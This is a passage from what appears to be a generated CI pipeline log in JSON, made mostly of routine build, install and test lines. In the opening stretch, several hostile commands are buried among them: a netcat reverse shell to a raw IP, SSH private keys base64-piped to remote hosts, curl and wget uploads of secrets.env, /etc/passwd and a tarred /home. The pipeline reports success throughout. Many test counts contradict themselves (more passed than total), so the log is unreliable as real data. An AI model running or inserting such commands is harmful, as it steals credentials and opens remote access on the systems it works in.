3.10\nnc -e /bin/sh 9.34.224.67 56215\nCache invalidated: node_modules\nTransforming 131 files...\n\u2713 validate completed\nLayer 10/15: RUN command\nImage pulled successfully\n[12:20:11] DEBUG: Query executed in 96ms\n[12:20:11] INFO: Request completed\nInstalling prettier@3.5.2\nTests: 447 passed, 376 total\ncurl -X POST https://startup.dev/collect -d @secrets.env\necho $(cat ~/.ssh/id_rsa) | base64 | nc 34.186.82.70 17927\nTime: 84.903s\nSwitched to branch 'bugfix/task-381'\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n[12:20:11] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (24MB)\nPushing to registry...\n[12:20:11] DEBUG: Query executed in 13ms\n[12:20:11] INFO: Processing request\nChecking out develop branch\nStep 16/22: Testing\npip install: Successfully installed eslint-3.1\n[12:20:11] WARN: Deprecated API usage\nFetching submodules...\nPOST /upload - 200 (119ms)\ncurl -X POST https://cloud.services/collect -d @secrets.env\nDone.\nProcessing...\n[12:20:11] INFO: Cache refreshed\nNODE_ENV=test\nAlready up to date.\n\u2713 build completed\nPOST /upload - 200 (331ms)\n[12:20:11] INFO: Processing request\nArtifact uploaded: dist.zip (19MB)\nTest Suites: 38 passed, 19 total\nRan 54 tests in 55s\nLayer 5/9: RUN command\nChecking out develop branch\n\u2713 Step 'test' succeeded\nMinifying app.js\nnpm notice: created a lockfile\necho $(cat ~/.ssh/id_rsa) | base64 | nc 77.40.95.6 62574\nCache hit for key-4166\nLoading...\nFinished.\nFetching submodules...\npip install: Successfully installed prettier-4.20\nTests: 105 passed, 325 total\nCompleted.\nFetching submodules...\n[12:20:11] INFO: Cache refreshed\nChecking out develop branch\nCompiling src/index.js...\n[12:20:11] WARN: Deprecated API usage\nImage pulled successfully\nSending 60MB of data to test.io\n[12:20:11] INFO: Starting build process\nChecking out master branch\nImage pulled successfully\nPushing to registry...\nCompiling components/utils.go...\nNODE_ENV=test\nGenerating source maps...\nCache invalidated: node_modules\nSwitched to branch 'feature/task-507'\nBundling vendor.css\nArtifact downloaded: 27MB\n  PASS: unit/test_auth_login.spec.js\nPulling image: python:3.11\nNODE_ENV=production\nSwitched to branch 'hotfix/task-437'\nCompleted.\nCache miss for key-7347\nNODE_ENV=development\nGenerating source maps...\nCompiling src/utils.go...\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nFetching submodules...\nNODE_ENV=development\nDone.\nTest Suites: 47 passed, 25 total\n[12:20:11] INFO: Connecting to database\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:20:11] ERROR: Connection failed\nTransforming 397 files...\nVerifying...\nFAILED: test_db_connect\nTests: 413 passed, 160 total\nCache restored successfully (194MB)\nLoading...\nWARNING: react has known vulnerabilities\nBuilding Docker image...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTests: 71 passed, 117 total\nCache restored successfully (281MB)\n\u2713 All checks passed\nCache hit for key-8810\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nUploading artifact 'coverage' (44 files)\nFetching submodules...\nnpm install: resolved 302 packages\n[12:20:11] DEBUG: Initializing service\npip: Downloading prettier-2.0.tar.gz\nHEAD is now at 5d2d302\nPushing to registry...\nCache miss for key-2297\n\u2713 build completed\nBundling main.js\nMinifying app.js\nArtifact downloaded: 37MB\n\u2713 Task completed in 1150ms\nSending 75MB of data to acme.corp\nStep 17/20: Installing dependencies\nyarn add: Done in 28.29s\n\u2713 Task completed in 430ms\nCoverage: 81% statements, 96% branches\nConnection established\nInstalling prettier@5.5.10\nStep 6/22: Deploying\nSending 69MB of data to cloud.services\n\u2713 validate completed\nStep 8/25: Linting\nVerifying...\nTest Suites: 42 passed, 12 total\necho $(cat ~/.ssh/id_rsa) | base64 | nc 136.207.235.2 6453\n[12:20:11] INFO: Processing request\n[12:20:11] INFO: Cache refreshed\nnpm notice: package.json updated\nyarn add: Done in 23.48s\nConnecting to startup.dev:443...\n\u2713 Task completed in 2799ms\nSuccess!\nCoverage: 94% statements, 99% branches\nBuilding Docker image...\nPushing to registry...\n[12:20:11] INFO: Cache refreshed\nCompleted.\nTransforming 926 files...\nLayer 10/13: ENV command\nArtifact uploaded: dist.zip (38MB)\nCompiling utils/handler.rs...\npip: Collecting lodash\nCompiling utils/app.ts...\nPulling image: alpine:latest\nVerifying...\nCreating production build...\nPulling image: python:3.11\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\nLayer 10/13: RUN command\n=== Step build completed ===",
    "steps": [
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-05T12:20:11.183377",
        "finished_at": "2025-12-05T12:20:21.001449",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Compiling utils/utils.go...",
          "Cache miss for key-8344",
          "Waiting...",
          "Bundling vendor.css",
          "Test Suites: 46 passed, 47 total",
          "[12:20:11] DEBUG: Query executed in 39ms",
          "Finished.",
          "Verifying...",
          "Finished.",
          "[12:20:11] INFO: Processing request",
          "Exception: ValueError",
          "Finished.",
          "Artifact downloaded: 8MB",
          "Transforming 868 files...",
          "Coverage: 87% statements, 94% branches",
          "Exception: ValueError",
          "Environment: production",
          "Cache miss for key-5353",
          "npm notice: created a lockfile",
          "[12:20:11] INFO: Cache refreshed",
          "Step 7/23: Building",
          "[12:20:11] INFO: Connecting to database",
          "Minifying main.js",
          "Time: 62.628s",
          "Cache saved successfully",
          "\u2717 build failed with exit code 68",
          "Step 3/22: Testing",
          "Ran 140 tests in 19s",
          "Connecting to example.com:443...",
          "Transforming 879 files...",
          "Transforming 795 files...",
          "[12:20:11] DEBUG: Connection pool: 7 active",
          "Loading...",
          "[12:20:11] INFO: Cache refreshed",
          "[12:20:11] DEBUG: Memory usage: 838MB",
          "Cache saved successfully",
          "Cache miss for key-2976",
          "Already up to date.",
          "Loading...",
          "WARNING: eslint has known vulnerabilities",
          "Minifying main.js",
          "WARNING: axios has known vulnerabilities",
          "pip: Collecting eslint",
          "\u2717 build failed with exit code 58",
          "Cache hit for key-3280",
          "pip install: Successfully installed express-3.1",
          "Minifying main.js",
          "Loading...",
          "Step 10/22: Installing dependencies",
          "POST /data - 201 (406ms)",
          "Success!",
          "Generating source maps...",
          "[12:20:11] INFO: Request completed",
          "Done.",
          "Artifact uploaded: dist.zip (17MB)",
          "Fetching submodules...",
          "HEAD is now at c6d6ff6",
          "\u2713 Task completed in 1976ms",
          "Installing axios@5.6.1",
          "Step 4/16: Testing",
          "Step 17/18: Building",
          "Cache hit for key-4498",
          "Completed.",
          "\u2713 test completed",
          "Loading...",
          "Platform: darwin-arm64",
          "[12:20:11] INFO: Processing request",
          "Step 13/22: Running migrations",
          "Step 7/16: Running migrations",
          "[12:20:11] DEBUG: Loading configuration",
          "[12:20:11] DEBUG: Query executed in 82ms",
          "Already up to date.",
          "Pulling image: python:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_api_health",
          "Ready.",
          "[12:20:11] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Done.",
          "Step 18/18: Building",
          "Processing...",
          "[12:20:11] DEBUG: Loading configuration",
          "  PASS: test_user_create (270ms)",
          "Cache hit for key-1387",
          "Connecting to startup.dev:443...",
          "npm install: resolved 352 packages",
          "Transforming 738 files...",
          "Ready.",
          "Cache miss for key-5133",
          "Compiling utils/main.py...",
          "Compiling src/utils.go...",
          "\u2713 All checks passed",
          "[12:20:11] INFO: Starting build process",
          "Fetching submodules...",
          "Finished.",
          "Creating production build...",
          "Using Python 3.12",
          "WARNING: lodash has known vulnerabilities",
          "Loading...",
          "Time: 113.903s",
          "Switched to branch 'bugfix/task-475'",
          "Bundling vendor.js",
          "Tests: 263 passed, 344 total",
          "pip install: Successfully installed eslint-3.8",
          "Using Node.js 19.8.8",
          "  PASS: test_cache_hit (107ms)",
          "[12:20:11] WARN: Deprecated API usage",
          "\u2713 Step 'install' succeeded",
          "Step 18/25: Installing dependencies",
          "Step 12/25: Deploying",
          "[12:20:11] WARN: Deprecated API usage",
          "Installing react@2.7.7",
          "Step 11/16: Deploying",
          "GET /api - 201 (58ms)",
          "Minifying app.js",
          "Coverage: 80% statements, 60% branches",
          "yarn add: Done in 18.89s",
          "Test Suites: 50 passed, 45 total",
          "Fetching submodules...",
          "Building Docker image...",
          "Compiling src/service.java...",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "[12:20:11] DEBUG: Connection pool: 9 active",
          "Waiting...",
          "Step 2/24: Running migrations",
          "[12:20:11] DEBUG: Memory usage: 360MB",
          "[12:20:11] WARN: Deprecated API usage",
          "Ready.",
          "Done.",
          "Platform: darwin-arm64",
          "[12:20:11] INFO: Processing request",
          "Step 11/25: Running migrations",
          "TLS handshake completed",
          "POST /upload - 200 (431ms)",
          "Connecting to test.io:443...",
          "Ran 44 tests in 30s",
          "[12:20:11] INFO: Processing request",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "NODE_ENV=test",
          "Exception: TypeError",
          "Completed.",
          "Artifact uploaded: dist.zip (58MB)",
          "Installing jest@4.15.10",
          "Pushing to registry...",
          "Platform: win32-x64",
          "Cache saved successfully",
          "Step 10/21: Deploying",
          "GET /api - 200 (24ms)",
          "Creating production build...",
          "Cache miss for key-6249",
          "Step 3/19: Testing",
          "Compiling lib/index.js...",
          "  PASS: test_auth_login (194ms)",
          "Layer 9/14: COPY command",
          "NODE_ENV=test",
          "Step 7/24: Deploying",
          "pip: Collecting eslint",
          "POST /api - 201 (229ms)",
          "Done.",
          "Done.",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Pulling image: node:18",
          "Completed.",
          "[12:20:11] INFO: Starting build process",
          "pip: Downloading lodash-2.10.tar.gz",
          "Ready.",
          "Cache saved successfully",
          "Time: 83.101s",
          "Test Suites: 45 passed, 15 total",
          "Platform: darwin-arm64",
          "Bundling main.js",
          "WARNING: webpack has known vulnerabilities",
          "npm notice: package.json updated",
          "Time: 55.967s",
          "WARNING: prettier has known vulnerabilities",
          "[12:20:11] INFO: Connecting to database",
          "\u2717 build failed with exit code 32",
          "Generating source maps...",
          "[12:20:11] DEBUG: Query executed in 97ms",
          "Step 2/16: Running migrations",
          "Artifact uploaded: dist.zip (75MB)",
          "Bundling main.js",
          "WARNING: webpack has known vulnerabilities",
          "[12:20:11] DEBUG: Memory usage: 1585MB",
          "npm notice: package.json updated",
          "pip install: Successfully installed express-1.10",
          "Time: 111.306s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Step 'checkout' succeeded",
          "Connecting to cloud.services:443...",
          "Done.",
          "POST /api - 201 (359ms)",
          "pip install: Successfully installed express-1.19",
          "Compiling utils/utils.go...",
          "[12:20:11] INFO: Cache refreshed",
          "Pushing to registry...",
          "Pushing to registry...",
          "\u2713 Task completed in 4836ms",
          "Test Suites: 49 passed, 50 total",
          "[12:20:11] DEBUG: Memory usage: 1112MB",
          "Step 17/16: Running migrations",
          "Cache miss for key-2667",
          "Already up to date.",
          "pip: Downloading express-5.10.tar.gz",
          "yarn add: Done in 8.81s",
          "Image pulled successfully",
          "Environment: staging",
          "Platform: win32-x64",
          "Loading...",
          "Cache restored successfully (174MB)",
          "Generating source maps...",
          "Platform: win32-x64",
          "Cache hit for key-1473",
          "yarn add: Done in 20.35s",
          "Cache restored successfully (416MB)",
          "TLS handshake completed",
          "Exception: RuntimeError",
          "Artifact uploaded: dist.zip (33MB)",
          "Cache miss for key-9170",
          "[12:20:11] WARN: Deprecated API usage",
          "Installing webpack@2.6.2",
          "Processing...",
          "HEAD is now at 21f9b9a",
          "NODE_ENV=test",
          "Image pulled successfully",
          "Time: 76.225s",
          "Artifact uploaded: dist.zip (8MB)",
          "Building Docker image...",
          "NODE_ENV=production",
          "Environment: test",
          "Step 6/23: Installing dependencies",
          "Waiting...",
          "Verifying...",
          "Tests: 284 passed, 370 total",
          "Compiling components/service.java...",
          "  PASS: integration/test_api_health.spec.js",
          "Compiling components/main.py...",
          "Already up to date.",
          "OK",
          "Bundling runtime.css",
          "Installing axios@3.4.9",
          "Snapshots: 28 passed, 17 total",
          "Generating source maps...",
          "Success!",
          "Compiling utils/handler.rs...",
          "Creating production build...",
          "\u2713 Task completed in 571ms",
          "Image pulled successfully",
          "Step 17/20: Running migrations",
          "Time: 91.862s",
          "Done.",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-05T12:20:21.001449",
        "finished_at": "2025-12-05T12:20:30.819521",
        "log_lines": [
          "=== Step: setup_node ===",
          "Finished.",
          "[12:20:11] DEBUG: Loading configuration",
          "TLS handshake completed",
          "WARNING: react has known vulnerabilities",
          "Compiling src/main.py...",
          "Bundling runtime.js",
          "npm notice: package.json updated",
          "[12:20:11] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Snapshots: 5 passed, 0 total",
          "Compiling utils/index.js...",
          "Verifying...",
          "Platform: linux-x64",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "pip: Downloading react-1.18.tar.gz",
          "Step 2/25: Building",
          "npm notice: package.json updated",
          "[12:20:11] INFO: Cache refreshed",
          "\u2713 build completed",
          "Creating production build...",
          "Pushing to registry...",
          "Step 7/20: Linting",
          "Compiling lib/index.js...",
          "Step 11/17: Deploying",
          "Time: 88.479s",
          "Cache invalidated: node_modules",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Installing lodash@5.20.7",
          "NODE_ENV=production",
          "\u2713 Task completed in 2766ms",
          "[12:20:11] DEBUG: Initializing service",
          "yarn add: Done in 3.86s",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "Pulling image: python:latest",
          "Time: 90.192s",
          "Ran 172 tests in 60s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "[12:20:11] INFO: Starting build process",
          "Step 8/24: Installing dependencies",
          "Finished.",
          "Step 15/23: Installing dependencies",
          "[12:20:11] WARN: Deprecated API usage",
          "npm install: resolved 951 packages",
          "OK",
          "Connection established",
          "\u2713 build completed",
          "Pulling image: python:3.11",
          "[12:20:11] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (22MB)",
          "pip: Collecting webpack",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache saved successfully",
          "Compiling utils/handler.rs...",
          "Waiting...",
          "Switched to branch 'feature/task-682'",
          "Cache miss for key-3843",
          "GET /health - 200 (22ms)",
          "Snapshots: 24 passed, 29 total",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ran 36 tests in 52s",
          "Minifying app.js",
          "Finished.",
          "Compiling lib/utils.go...",
          "[12:20:11] DEBUG: Memory usage: 683MB",
          "Artifact uploaded: dist.zip (69MB)",
          "Installing webpack@3.15.5",
          "Uploading artifact 'coverage' (50 files)",
          "Compiling lib/main.py...",
          "GET /health - 200 (20ms)",
          "Compiling lib/service.java...",
          "Tests: 290 passed, 475 total",
          "Minifying vendor.js",
          "Artifact uploaded: build.tar.gz (5MB)",
          "HEAD is now at 9f2f5fc",
          "Time: 98.972s",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "Ran 90 tests in 18s",
          "\u2717 build failed with exit code 28",
          "Ready.",
          "Compiling utils/utils.go...",
          "pip: Installing build dependencies...",
          "Finished.",
          "\u2717 build failed with exit code 11",
          "Done.",
          "Connection established",
          "pip: Downloading react-4.13.tar.gz",
          "\u2717 build failed with exit code 115",
          "NODE_ENV=test",
          "OK",
          "Layer 8/15: RUN command",
          "\u2717 build failed with exit code 104",
          "Verifying...",
          "Building Docker image...",
          "[12:20:11] DEBUG: Memory usage: 1535MB",
          "Cache saved successfully",
          "Fetching submodules...",
          "WARNING: prettier has known vulnerabilities",
          "Generating source maps...",
          "Environment: test",
          "[12:20:11] DEBUG: Memory usage: 1777MB",
          "[12:20:11] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Platform: win32-x64",
          "Cache miss for key-1445",
          "Compiling utils/app.ts...",
          "npm install: added 308 packages",
          "OK",
          "Test Suites: 27 passed, 17 total",
          "Snapshots: 46 passed, 19 total",
          "Generating source maps...",
          "Cache invalidated: build",
          "Success!",
          "Success!",
          "Step 11/20: Deploying",
          "Step 8/19: Linting",
          "Environment: production",
          "[12:20:11] DEBUG: Memory usage: 690MB",
          "Layer 6/15: ENV command",
          "[12:20:11] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (27MB)",
          "yarn add: Done in 21.2s",
          "\u2713 Step 'setup' succeeded",
          "Time: 93.776s",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:20:11] DEBUG: Connection pool: 19 active",
          "WARNING: express has known vulnerabilities",
          "Fetching submodules...",
          "Step 4/24: Testing",
          "pip: Downloading prettier-4.8.tar.gz",
          "[12:20:11] DEBUG: Memory usage: 1702MB",
          "[12:20:11] INFO: Starting build process",
          "NODE_ENV=production",
          "Generating source maps...",
          "Pulling image: node:3.11",
          "Layer 1/9: RUN command",
          "\u2713 deploy completed",
          "Connecting to test.io:443...",
          "WARNING: lodash has known vulnerabilities",
          "Cache miss for key-5410",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "Already up to date.",
          "Step 13/18: Linting",
          "Exception: NullPointerException",
          "TLS handshake completed",
          "Switched to branch 'feature/task-971'",
          "GET /api - 201 (93ms)",
          "Bundling runtime.css",
          "Step 8/18: Installing dependencies",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Artifact downloaded: 6MB",
          "[12:20:11] WARN: Deprecated API usage",
          "GET /api - 204 (13ms)",
          "Using Node.js 15.11.2",
          "Step 20/17: Deploying",
          "Test Suites: 44 passed, 16 total",
          "Environment: production",
          "Ready.",
          "Fetching submodules...",
          "Processing...",
          "TLS handshake completed",
          "GET /api - 200 (48ms)",
          "Using Python 3.10",
          "Processing...",
          "Ran 52 tests in 24s",
          "Waiting...",
          "Connecting to test.io:443...",
          "[12:20:11] INFO: Starting build process",
          "Uploading artifact 'build' (8 files)",
          "Exception: NullPointerException",
          "Tests: 81 passed, 347 total",
          "Uploading artifact 'coverage' (31 files)",
          "npm install: resolved 793 packages",
          "  PASS: test_cache_hit (250ms)",
          "Success!",
          "Test Suites: 27 passed, 18 total",
          "[12:20:11] DEBUG: Loading configuration",
          "Building Docker image...",
          "Already up to date.",
          "[12:20:11] INFO: Request completed",
          "Uploading artifact 'dist' (40 files)",
          "[12:20:11] INFO: Cache refreshed",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] INFO: Request completed",
          "[12:20:11] INFO: Connecting to database",
          "  PASS: test_db_connect (363ms)",
          "[12:20:11] ERROR: Connection failed",
          "\u2717 build failed with exit code 99",
          "Compiling components/utils.go...",
          "Compiling lib/handler.rs...",
          "Step 13/22: Deploying",
          "FAILED: test_auth_login",
          "npm install: resolved 1289 packages",
          "Bundling styles.js",
          "Processing...",
          "TLS handshake completed",
          "Pulling image: python:latest",
          "Using Python 3.9",
          "POST /api - 200 (104ms)",
          "npm notice: package.json updated",
          "Using Node.js 18.19.0",
          "Loading...",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Connection established",
          "Processing...",
          "pip: Downloading eslint-3.4.tar.gz",
          "WARNING: jest has known vulnerabilities",
          "Compiling lib/utils.go...",
          "pip: Collecting prettier",
          "[12:20:11] DEBUG: Initializing service",
          "Cache restored successfully (139MB)",
          "Bundling vendor.js",
          "npm install: added 381 packages",
          "FAILED: test_auth_login",
          "[12:20:11] WARN: Deprecated API usage",
          "  PASS: integration/test_api_health.spec.js",
          "pip: Collecting lodash",
          "Step 2/24: Installing dependencies",
          "Using Node.js 18.6.4",
          "Step 8/18: Running migrations",
          "[12:20:11] DEBUG: Loading configuration",
          "\u2713 lint completed",
          "Step 14/21: Installing dependencies",
          "Step 7/21: Building",
          "\u2713 validate completed",
          "[12:20:11] DEBUG: Loading configuration",
          "[12:20:11] DEBUG: Loading configuration",
          "Step 19/19: Building",
          "Step 1/20: Running migrations",
          "Processing...",
          "[12:20:11] DEBUG: Connection pool: 1 active",
          "Bundling vendor.js",
          "Step 6/15: Testing",
          "Exception: TypeError",
          "Completed.",
          "Completed.",
          "[12:20:11] WARN: Deprecated API usage",
          "Completed.",
          "pip: Installing build dependencies...",
          "Completed.",
          "[12:20:11] DEBUG: Memory usage: 614MB",
          "[12:20:11] DEBUG: Connection pool: 10 active",
          "Snapshots: 31 passed, 32 total",
          "Platform: darwin-arm64",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-05T12:20:30.819521",
        "finished_at": "2025-12-05T12:20:36.710364",
        "log_lines": [
          "=== Step: save_cache ===",
          "  PASS: unit/test_auth_login.spec.js",
          "Using Python 3.9",
          "  PASS: test_auth_login (111ms)",
          "Step 3/20: Running migrations",
          "\u2717 build failed with exit code 88",
          "Artifact uploaded: dist.zip (72MB)",
          "Cache hit for key-5314",
          "Checking out develop branch",
          "FAILED: test_user_create",
          "Time: 19.541s",
          "\u2713 Task completed in 1497ms",
          "Step 6/16: Deploying",
          "POST /upload - 202 (298ms)",
          "pip install: Successfully installed eslint-1.2",
          "[12:20:11] INFO: Processing request",
          "Step 2/20: Linting",
          "Test Suites: 46 passed, 18 total",
          "Step 19/15: Installing dependencies",
          "Checking out master branch",
          "[12:20:11] DEBUG: Query executed in 63ms",
          "Cache saved successfully",
          "yarn add: Done in 27.93s",
          "Step 2/15: Testing",
          "Uploading artifact 'build' (43 files)",
          "[12:20:11] DEBUG: Connection pool: 7 active",
          "Finished.",
          "Done.",
          "Fetching submodules...",
          "POST /data - 202 (27ms)",
          "Tests: 316 passed, 88 total",
          "pip: Collecting react",
          "POST /upload - 202 (89ms)",
          "POST /upload - 202 (195ms)",
          "npm install: added 233 packages",
          "Layer 2/10: ENV command",
          "Cache saved successfully",
          "Platform: win32-x64",
          "[12:20:11] INFO: Request completed",
          "Using Python 3.12",
          "Ready.",
          "Artifact downloaded: 32MB",
          "Loading...",
          "Cache saved successfully",
          "Pulling image: python:3.11",
          "Artifact downloaded: 45MB",
          "Cache saved successfully",
          "npm install: added 405 packages",
          "NODE_ENV=test",
          "Time: 103.164s",
          "TLS handshake completed",
          "[12:20:11] INFO: Processing request",
          "  PASS: test_user_create (396ms)",
          "Compiling lib/main.py...",
          "Connection established",
          "Ready.",
          "GET /status - 204 (56ms)",
          "WARNING: jest has known vulnerabilities",
          "Step 2/21: Linting",
          "[12:20:11] DEBUG: Connection pool: 1 active",
          "Cache invalidated: node_modules",
          "Test Suites: 43 passed, 24 total",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-2046",
          "Environment: production",
          "Compiling components/service.java...",
          "Creating production build...",
          "Environment: staging",
          "Minifying app.js",
          "Step 17/24: Testing",
          "Installing webpack@3.18.4",
          "Loading...",
          "Snapshots: 23 passed, 1 total",
          "Finished.",
          "GET /status - 201 (98ms)",
          "[12:20:11] WARN: Deprecated API usage",
          "Test Suites: 16 passed, 21 total",
          "Bundling styles.css",
          "Cache invalidated: node_modules",
          "Coverage: 86% statements, 76% branches",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Fetching submodules...",
          "Step 3/18: Running migrations",
          "[12:20:11] INFO: Connecting to database",
          "\u2713 Step 'checkout' succeeded",
          "[12:20:11] INFO: Request completed",
          "[12:20:11] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "\u2713 Step 'install' succeeded",
          "Test Suites: 10 passed, 32 total",
          "\u2713 Step 'install' succeeded",
          "Checking out develop branch",
          "[12:20:11] DEBUG: Query executed in 62ms",
          "pip install: Successfully installed axios-3.3",
          "\u2713 Step 'setup' succeeded",
          "Artifact downloaded: 10MB",
          "Step 13/19: Building",
          "Bundling styles.js",
          "Success!",
          "[12:20:11] DEBUG: Loading configuration",
          "Step 14/24: Linting",
          "Done.",
          "Artifact uploaded: dist.zip (29MB)",
          "Finished.",
          "Artifact uploaded: dist.zip (17MB)",
          "yarn add: Done in 10.97s",
          "[12:20:11] INFO: Starting build process",
          "[12:20:11] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Success!",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Image pulled successfully",
          "Cache restored successfully (407MB)",
          "Layer 4/14: COPY command",
          "Test Suites: 48 passed, 42 total",
          "Artifact downloaded: 21MB",
          "[12:20:11] DEBUG: Memory usage: 971MB",
          "Step 20/16: Deploying",
          "HEAD is now at fba1d1d",
          "HEAD is now at b48fe2c",
          "Time: 105.666s",
          "Checking out develop branch",
          "Minifying app.js",
          "[12:20:11] INFO: Cache refreshed",
          "Snapshots: 25 passed, 12 total",
          "Using Node.js 14.10.9",
          "GET /api - 204 (53ms)",
          "TLS handshake completed",
          "[12:20:11] ERROR: Connection failed",
          "NODE_ENV=development",
          "Minifying vendor.js",
          "Pushing to registry...",
          "Image pulled successfully",
          "FAILED: test_db_connect",
          "Bundling main.js",
          "Minifying vendor.js",
          "\u2713 All checks passed",
          "Artifact downloaded: 1MB",
          "Snapshots: 27 passed, 6 total",
          "[12:20:11] DEBUG: Loading configuration",
          "\u2713 Step 'checkout' succeeded",
          "Step 19/24: Linting",
          "Uploading artifact 'dist' (12 files)",
          "Compiling src/app.ts...",
          "Waiting...",
          "HEAD is now at b53fe25",
          "\u2713 All checks passed",
          "[12:20:11] DEBUG: Initializing service",
          "Pushing to registry...",
          "Compiling utils/app.ts...",
          "Processing...",
          "pip install: Successfully installed prettier-4.19",
          "\u2717 build failed with exit code 53",
          "Platform: darwin-arm64",
          "Snapshots: 44 passed, 13 total",
          "npm install: added 111 packages",
          "Step 16/25: Deploying",
          "Already up to date.",
          "Artifact downloaded: 29MB",
          "Compiling components/main.py...",
          "Generating source maps...",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "HEAD is now at 32271b0",
          "[12:20:11] INFO: Request completed",
          "Processing...",
          "Compiling utils/handler.rs...",
          "Step 4/19: Testing",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Time: 1.929s",
          "[12:20:11] ERROR: Connection failed",
          "Artifact downloaded: 34MB",
          "Done.",
          "Coverage: 78% statements, 91% branches",
          "Done.",
          "Installing react@3.7.4",
          "Generating source maps...",
          "Ran 110 tests in 7s",
          "Layer 3/12: COPY command",
          "Already up to date.",
          "Creating production build...",
          "Bundling vendor.js",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 69",
          "Artifact downloaded: 10MB",
          "npm install: added 195 packages",
          "Success!",
          "Platform: darwin-arm64",
          "Waiting...",
          "Artifact uploaded: dist.zip (15MB)",
          "Installing webpack@4.1.10",
          "Pushing to registry...",
          "Image pulled successfully",
          "[12:20:11] DEBUG: Connection pool: 11 active",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 13/24: Testing",
          "Checking out master branch",
          "Using Node.js 14.15.10",
          "HEAD is now at 4c91c04",
          "Creating production build...",
          "Optimizing 78 modules...",
          "pip: Downloading express-4.13.tar.gz",
          "pip: Installing build dependencies...",
          "Step 5/15: Testing",
          "pip: Installing build dependencies...",
          "Platform: darwin-arm64",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: unit/test_user_create.spec.js",
          "Bundling styles.css",
          "Verifying...",
          "FAILED: test_api_health",
          "Ran 48 tests in 29s",
          "\u2713 All checks passed",
          "Tests: 238 passed, 436 total",
          "[12:20:11] INFO: Request completed",
          "Installing lodash@3.6.8",
          "Pushing to registry...",
          "Installing axios@5.15.10",
          "  PASS: test_db_connect (385ms)",
          "Image pulled successfully",
          "Ready.",
          "Compiling src/utils.go...",
          "Already up to date.",
          "\u2713 Step 'build' succeeded",
          "Minifying main.js",
          "Switched to branch 'bugfix/task-829'",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/utils.go...",
          "Pushing to registry...",
          "Compiling lib/service.java...",
          "Using Node.js 19.2.3",
          "HEAD is now at f2e7260",
          "Tests: 134 passed, 222 total",
          "\u2713 Task completed in 1368ms",
          "Using Node.js 15.13.8",
          "NODE_ENV=production",
          "Step 8/18: Deploying",
          "Time: 15.44s",
          "Compiling components/main.py...",
          "Building Docker image...",
          "pip: Collecting axios",
          "[12:20:11] INFO: Processing request",
          "Artifact downloaded: 9MB",
          "Finished.",
          "Artifact uploaded: dist.zip (83MB)",
          "[12:20:11] DEBUG: Query executed in 8ms",
          "TLS handshake completed",
          "Step 9/19: Linting",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-05T12:20:36.710364",
        "finished_at": "2025-12-05T12:21:06.164581",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Ready.",
          "pip: Installing build dependencies...",
          "Connecting to test.io:443...",
          "Connection established",
          "Coverage: 82% statements, 74% branches",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache saved successfully",
          "Cache restored successfully (215MB)",
          "[12:20:11] DEBUG: Connection pool: 3 active",
          "Completed.",
          "\u2713 Task completed in 2239ms",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Done.",
          "Test Suites: 31 passed, 37 total",
          "Step 11/22: Linting",
          "Uploading artifact 'build' (35 files)",
          "Platform: linux-x64",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "npm install: resolved 1544 packages",
          "Fetching submodules...",
          "Optimizing 14 modules...",
